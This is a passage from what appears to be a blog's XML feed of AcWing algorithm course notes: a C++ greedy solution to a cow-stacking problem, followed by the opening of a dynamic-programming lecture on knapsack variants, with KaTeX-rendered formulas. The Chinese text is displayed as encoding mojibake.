xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub><mo>&gt;</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">w_i+s_i &gt; max(s_i, w_{i+1}+s_{i+1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>æ‰€ä»¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>&gt;</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">max(s_{i+1}, w_i+s_i) &gt; max(s_i, w_{i+1}+s_{i+1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">5e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">PII cows[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> w, s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;w, &amp;s);</span><br><span class="line">    cows[i] = &#123;w + s, s&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(cows, cows + n);</span><br><span class="line">  <span class="type">int</span> res = <span class="number">-2e9</span>, sum = <span class="number">0</span>;  <span class="comment">// resåˆå§‹åŒ–è¦è¶³å¤Ÿå°: æœ€å¤§å±é™©ç³»æ•°å¯èƒ½ä¸ºå¤§è´Ÿæ•°</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> w = cows[i].first - cows[i].second, s = cows[i].second;</span><br><span class="line">    res = <span class="built_in">max</span>(res, sum - s);</span><br><span class="line">    sum += w;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
          <category> AcWingç®—æ³•åŸºç¡€è¯¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è´ªå¿ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬5è®² åŠ¨æ€è§„åˆ’</title>
      <link href="/2022/11/21/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-5-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2022/11/21/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-5-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h1 id="èƒŒåŒ…é—®é¢˜">èƒŒåŒ…é—®é¢˜</h1><table><thead><tr><th style="text-align:left">èƒŒåŒ…é—®é¢˜</th><th style="text-align:left">æ¯ä¸ªç‰©å“æ•°é‡</th><th style="text-align:left">çŠ¶æ€è½¬ç§»å‡½æ•°</th></tr></thead><tbody><tr><td style="text-align:left">01èƒŒåŒ…</td><td style="text-align:left">1</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>âˆ’</mo><mi>v</mi><mo stretchy="false">)</mo><mo>+</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(i, j) = max(f(i -1, j), f(i -1, j - v) + w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span></td></tr><tr><td style="text-align:left">å®Œå…¨èƒŒåŒ…</td><td style="text-align:left">æ— é™</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>âˆ’</mo><mi>v</mi><mo stretchy="false">)</mo><mo>+</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(i, j) = max(f(i -1, j), f(i, j - v) + w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span></td></tr><tr><td style="text-align:left">å¤šé‡èƒŒåŒ…</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">æŠŠç‰©å“iæ‰“åŒ…æˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">logs_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ä¸ªç‰©å“, è½¬åŒ–ä¸º01èƒŒåŒ…</td></tr><tr><td style="text-align:left">åˆ†ç»„èƒŒåŒ…</td><td style="text-align:left">æ¯ç»„é‡Œåªèƒ½é€‰1ä¸ª</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>âˆ’</mo><mi>v</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>+</mo><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">f(i, j) = max(f(i - 1, j - v(i, k)) + w(i, k)), k = 0,..,s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">))</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td></tr></tbody></table><p>é˜å¼DPæ³•ï¼š</p><ul><li><p>çŠ¶æ€è¡¨ç¤º<code>f[i][j]</code></p><ul><li><p>é›†åˆ</p><ul><li>åªä»<strong>å‰iä¸ªç‰©å“</strong>ä¸­å»é€‰ï¼Œä¸”<strong>æ€»ä½“ç§¯ä¸è¶…è¿‡j</strong>çš„<strong>æ‰€æœ‰é€‰é¡¹</strong></li><li>å±æ€§ Max, Min, Num</li></ul></li></ul></li><li><p>çŠ¶æ€è®¡ç®—</p><ul><li>é›†åˆåˆ’åˆ†</li></ul></li></ul><span id="more"></span><h2 id="AcWing-2-01èƒŒåŒ…é—®é¢˜"><a href="https://www.acwing.com/problem/content/2/">AcWing 2. 01èƒŒåŒ…é—®é¢˜ </a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ä»¶ç‰©å“å’Œä¸€ä¸ªå®¹é‡æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> çš„èƒŒåŒ…ã€‚æ¯ä»¶ç‰©å“åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚</p><p>ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ä»¶ç‰©å“çš„ä½“ç§¯æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œä»·å€¼æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" 